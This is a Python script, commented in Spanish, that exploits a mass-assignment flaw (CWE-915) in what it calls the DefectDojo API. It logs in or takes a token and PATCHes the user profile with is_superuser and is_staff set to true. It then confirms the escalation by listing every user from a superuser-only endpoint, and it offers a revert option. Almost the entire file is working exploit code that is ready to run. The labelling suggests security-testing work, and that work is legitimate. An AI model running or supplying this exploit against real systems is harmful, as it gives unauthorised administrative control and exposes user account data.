"""
A08:2025 — Vuln 3: Mass Assignment / Escalada de privilegios (CWE-915)

El endpoint PATCH /api/v2/user_profile/ aplica directamente todos los campos
del cuerpo de la petición al modelo de usuario sin ningún allowlist,
permitiendo que cualquier usuario autenticado se convierta en superusuario.

Uso:
    python A08_V3.py --host http://<HOST> --user <USER> --password <PASS>
    python A08_V3.py --host http://<HOST> --token <API_TOKEN>
    python A08_V3.py --host http://<HOST> --token <API_TOKEN> --revert
"""

import argparse
import json
import urllib.error
import urllib.parse
import urllib.request


# ---------------------------------------------------------------------------
# Helpers HTTP
# ---------------------------------------------------------------------------

def _request(method: str, url: str, token: str, body: dict | None = None) -> tuple[int, bytes]:
    data = json.dumps(body).encode() if body is not None else None
    headers = {
        "Authorization": f"Token {token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def get_token(host: str, username: str, password: str) -> str:
    """Obtiene el token de API via /api/v2/api-token-auth/."""
    url = f"{host.rstrip('/')}/api/v2/api-token-auth/"
    body = json.dumps({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        url, data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read())["token"]
    except urllib.error.HTTPError as e:
        raise RuntimeError(f"Error al obtener token (HTTP {e.code}): {e.read().decode()}")


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def show_profile(host: str, token: str, label: str) -> dict:
    status, body = _request("GET", f"{host}/api/v2/user_profile/", token)
    if status != 200:
        print(f"    Error al obtener perfil: HTTP {status}")
        return {}
    d = json.loads(body)
    u = d.get("user", d)
    print(f"  {label}: username={u['username']}  is_superuser={u.get('is_superuser')}  is_staff={u.get('is_staff', 'N/A')}")
    return u


def exploit(host: str, token: str, revert: bool = False) -> None:
    host = host.rstrip("/")

    print("\n" + "=" * 60)
    print("VULN 3 — Mass Assignment (CWE-915)")
    print("=" * 60)

    if revert:
        # Revertir: quitar privilegios
        print("\n[*] Revirtiendo — PATCH is_superuser=false, is_staff=false")
        status, body = _request("PATCH", f"{host}/api/v2/user_profile/", token,
                                body={"is_superuser": False, "is_staff": False})
        if status == 200:
            print("[+] Privilegios revertidos correctamente")
        else:
            print(f"[-] Error al revertir: HTTP {status} — {body.decode()}")
        show_profile(host, token, "Perfil actual")
        return

    # Paso 1 — Perfil antes del exploit
    print("\n[1] Perfil ANTES del exploit:")
    u_before = show_profile(host, token, "  Estado")

    # Paso 2 — PATCH con campos privilegiados
    print("\n[2] PATCH /api/v2/user_profile/ con is_superuser=true...")
    status, body = _request("PATCH", f"{host}/api/v2/user_profile/", token,
                            body={"is_superuser": True, "is_staff": True})
    if status == 200:
        print(f"    HTTP 200 — {body.decode()}")
    else:
        print(f"    HTTP {status} — {body.decode()}")
        return

    # Paso 3 — Verificar escalada
    print("\n[3] Perfil DESPUÉS del exploit:")
    u_after = show_profile(host, token, "  Estado")

    # Paso 4 — Confirmar acceso a endpoint restringido
    print("\n[4] Verificando acceso a GET /api/v2/users/ (solo superusuarios):")
    status, body = _request("GET", f"{host}/api/v2/users/?format=json", token)
    if status == 200:
        d = json.loads(body)
        print(f"    HTTP 200 — {d['count']} usuarios visibles ← ESCALADA EXITOSA")
        print()
        print(f"    {'Usuario':<22} {'Superuser':<12} {'Activo'}")
        print(f"    {'-'*22} {'-'*12} {'-'*6}")
        for u in d["results"]:
            print(f"    {u['username']:<22} {str(u.get('is_superuser')):<12} {u.get('is_active')}")
    else:
        print(f"    HTTP {status} — escalada no confirmada")

    print()
    print("[!] Para revertir los cambios ejecutar:")
    print(f"    python A08_V3.py --host {host} --token <TOKEN> --revert")
    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit Vuln 3 — Mass Assignment (CWE-915)"
    )
    parser.add_argument("--host", required=True, help="URL base, ej: http://host:8080")
    parser.add_argument("--revert", action="store_true",
                        help="Revertir is_superuser y is_staff a false")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--token", metavar="API_TOKEN",
                       help="Token de API de DefectDojo")
    group.add_argument("--user", metavar="USERNAME",
                       help="Usuario para obtener token automáticamente (requiere --password)")
    parser.add_argument("--password", metavar="PASSWORD",
                       help="Contraseña para obtener token automáticamente")
    args = parser.parse_args()

    if args.user and not args.password:
        parser.error("--user requiere --password")

    if args.token:
        token = args.token
    else:
        print(f"[*] Obteniendo token de API para '{args.user}'...")
        token = get_token(args.host, args.user, args.password)
        print(f"[+] Token: {token[:10]}...")

    exploit(args.host, token, revert=args.revert)
